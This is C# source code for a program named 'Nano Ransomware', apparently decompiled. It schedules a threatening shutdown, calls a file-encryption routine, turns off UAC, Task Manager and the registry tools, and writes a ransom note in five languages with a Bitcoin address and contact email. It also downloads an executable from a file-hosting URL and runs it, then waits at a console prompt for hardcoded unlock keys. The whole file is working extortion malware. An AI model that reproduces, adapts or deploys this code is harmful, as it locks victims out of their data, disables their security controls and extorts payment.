using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using Microsoft.Win32;

namespace Nano_Ransomware;

internal class Program
{
	private static void Main(string[] args)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo("shutdown", "-s -t 86400000 -c You only have 24 hours to pay the Ransom, if the payment isn't made by tomorrow night we'll brick your entire system.");
		processStartInfo.CreateNoWindow = true;
		processStartInfo.UseShellExecute = false;
		Process.Start(processStartInfo);
		Nano_Crypt.Start();
		RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("FilterAdministratorToken", 1, RegistryValueKind.DWord);
		RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey2.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
		RegistryKey registryKey3 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey3.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
		RegistryKey registryKey4 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey4.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
		dropRansomNote();
		dropCMDKEY();
		ServicePointManager.Expect100Continue = true;
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		WebClient webClient = new WebClient();
		webClient.DownloadFile("https://www.mediafire.com/file/2ebl2awf8jail5b/RANSOM.exe/file", "C:\\\\Users" + Environment.UserName + "\\RANSOM.EXE");
		Thread.Sleep(2000);
		Process.Start("C:\\\\Users\\\\" + Environment.UserName + "\\RANSOM.exe");
	}

	public static void dropRansomNote()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		using (StreamWriter streamWriter = File.CreateText(folderPath + "\\Nano_Note.txt"))
		{
			streamWriter.WriteLine("Your files are encrypted by Nano Ransomware, meaning that your data is encrypted with an military grade encryption.");
			streamWriter.WriteLine("To gain the ability to access your data back, or decrypt, you will need to pay for it, obviosly.The payment is accepted only in Bitcoin");
			streamWriter.WriteLine("The price is $300, send the exact amount to 1HNkDUPxEhnN8Q2ZicSnmrifDJYUpAFdbG .");
			streamWriter.WriteLine("Once you send the payment, e-mail danielnusradin@gmail.com your BTC transaction ID, and wait for a reply.");
			streamWriter.WriteLine("You should receive a reply from the same address, only this time with a decryption Key.");
			streamWriter.WriteLine("+----------------------------------------Russian--------------------------------------------------------+");
			streamWriter.WriteLine("Ваши файлы зашифрованы Nano Ransomware, что означает, что ваши данные зашифрованы шифрованием военного уровня.");
			streamWriter.WriteLine("Чтобы получить возможность получить доступ к своим данным или расшифровать их, вам, очевидно, нужно будет заплатить за это. Оплата принимается только в биткойнах.");
			streamWriter.WriteLine("Цена $300, точную сумму отправьте на 1HNkDUPxEhnN8Q2ZicSnmrifDJYUpAFdbG.");
			streamWriter.WriteLine("После того, как вы отправите платеж по электронной почте danielnusradin@gmail.com, укажите идентификатор транзакции BTC и дождитесь ответа.");
			streamWriter.WriteLine("You should receive a reply from the same address, only this time with a decryption Key.");
			streamWriter.WriteLine("+----------------------------------------Azerbaijan--------------------------------------------------------+");
			streamWriter.WriteLine("Fayllarınız Nano Ransomware tərəfindən şifrələnir, yəni məlumatlarınız hərbi dərəcəli şifrələmə ilə şifrələnir.");
			streamWriter.WriteLine("Məlumatlarınıza geri daxil olmaq və ya şifrəni açmaq imkanı əldə etmək üçün siz bunun üçün ödəniş etməlisiniz, açıq-aydın. Ödəniş yalnız Bitcoin-də qəbul edilir.");
			streamWriter.WriteLine("Qiymət 300 dollardır, dəqiq məbləği 1HNkDUPxEhnN8Q2ZicSnmrifDJYUpAFdbG ünvanına göndərin.");
			streamWriter.WriteLine("Ödəniş e-poçtunu danielnusradin@gmail.com ünvanına göndərdikdən sonra BTC əməliyyat ID-nizi göndərin və cavabı gözləyin.");
			streamWriter.WriteLine("You should receive a reply from the same address, only this time with a decryption Key.");
			streamWriter.WriteLine("+----------------------------------------Chinese-------------------------------------------------------- +");
			streamWriter.WriteLine("您的文件由 Nano Ransomware 加密，这意味着您的数据使用军用级加密进行加密.");
			streamWriter.WriteLine("要获得取回您的数据或解密的能力，您显然需要为此付费。付款仅接受比特币”");
			streamWriter.WriteLine("价格为 300 美元，将确切金额发送至 1HNkDUPxEhnN8Q2ZicSnmrifDJYUpAFdbG 。");
			streamWriter.WriteLine("一旦您将您的 BTC 交易 ID 发送到付款电子邮件 danielnusradin@gmail.com，然后等待回复。”");
			streamWriter.WriteLine("您应该会收到来自同一地址的回复，只是这次带有解密密钥。");
			streamWriter.WriteLine("+----------------------------------------Italian-------------------------------------------------------- +");
			streamWriter.WriteLine("I tuoi file sono crittografati da Nano Ransomware, il che significa che i tuoi dati sono crittografati con una crittografia di livello militare.");
			streamWriter.WriteLine("Per ottenere la possibilità di accedere ai tuoi dati, o decrittarli, dovrai pagarli, ovviamente. Il pagamento è accettato solo in Bitcoin");
			streamWriter.WriteLine("Il prezzo è di $ 300, invia l'importo esatto a 1HNkDUPxEhnN8Q2ZicSnmrifDJYUpAFdbG .");
			streamWriter.WriteLine("Una volta inviato il pagamento, invia un'e-mail a danielnusradin@gmail.com con il tuo ID transazione BTC e attendi una risposta.");
			streamWriter.WriteLine("You should receive a reply from the same address, only this time with a decryption Key.");
		}
		Process.Start("C:\\\\Users\\\\" + Environment.UserName + "\\Desktop\\Nano_Note.txt");
	}

	public static void dropCMDKEY()
	{
		Console.WriteLine("This is the terminal where you'll have to type the decryption Key.");
		Console.Write("Key: ");
		string text = Console.ReadLine();
		while (true)
		{
			switch (text)
			{
			case "az900io@":
			{
				Console.WriteLine("Decrypting sectors are being decrypted...");
				Process[] array9 = null;
				Thread.Sleep(14000);
				array9 = Process.GetProcessesByName("Windows Command Processor");
				Process[] array10 = array9;
				foreach (Process process5 in array10)
				{
					process5.Kill();
				}
				Nano_Crypt.OFF_Encrypt();
				Process[] array11 = null;
				array11 = Process.GetProcessesByName("Nano_Ransomware");
				Process[] array12 = array11;
				foreach (Process process6 in array12)
				{
					process6.Kill();
				}
				RegistryKey registryKey9 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey9.SetValue("FilterAdministratorToken", 0, RegistryValueKind.DWord);
				RegistryKey registryKey10 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey10.SetValue("EnableLUA", 1, RegistryValueKind.DWord);
				RegistryKey registryKey11 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey11.SetValue("DisableTaskMgr", 0, RegistryValueKind.DWord);
				RegistryKey registryKey12 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey12.SetValue("DisableRegistryTools", 0, RegistryValueKind.DWord);
				break;
			}
			case "KXZQEBBPY7DZ":
			{
				Console.WriteLine("Decrypting sectors are being decrypted...");
				Process[] array5 = null;
				array5 = Process.GetProcessesByName("Windows Command Processor");
				Process[] array6 = array5;
				foreach (Process process3 in array6)
				{
					process3.Kill();
				}
				Nano_Crypt.OFF_Encrypt();
				Process[] array7 = null;
				array7 = Process.GetProcessesByName("Nano_Ransomware");
				Process[] array8 = array7;
				foreach (Process process4 in array8)
				{
					process4.Kill();
				}
				RegistryKey registryKey5 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey5.SetValue("FilterAdministratorToken", 0, RegistryValueKind.DWord);
				RegistryKey registryKey6 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey6.SetValue("EnableLUA", 1, RegistryValueKind.DWord);
				RegistryKey registryKey7 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey7.SetValue("DisableTaskMgr", 0, RegistryValueKind.DWord);
				RegistryKey registryKey8 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey8.SetValue("DisableRegistryTools", 0, RegistryValueKind.DWord);
				break;
			}
			case "20bh333@":
			{
				Console.WriteLine("Decrypting sectors are being decrypted...");
				Process[] array = null;
				array = Process.GetProcessesByName("Windows Command Processor");
				Process[] array2 = array;
				foreach (Process process in array2)
				{
					process.Kill();
				}
				Nano_Crypt.OFF_Encrypt();
				Process[] array3 = null;
				array3 = Process.GetProcessesByName("Nano_Ransomware");
				Process[] array4 = array3;
				foreach (Process process2 in array4)
				{
					process2.Kill();
				}
				RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey.SetValue("FilterAdministratorToken", 0, RegistryValueKind.DWord);
				RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey2.SetValue("EnableLUA", 1, RegistryValueKind.DWord);
				RegistryKey registryKey3 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey3.SetValue("DisableTaskMgr", 0, RegistryValueKind.DWord);
				RegistryKey registryKey4 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey4.SetValue("DisableRegistryTools", 0, RegistryValueKind.DWord);
				break;
			}
			default:
			{
				string value = "The key is incorrect, please try again";
				Console.WriteLine(value);
				Console.Write("Key: ");
				text = Console.ReadLine();
				break;
			}
			case "":
				Console.WriteLine("The key is incorrect, please try again!");
				Console.Write("Key: ");
				text = Console.ReadLine();
				break;
			}
		}
	}
}
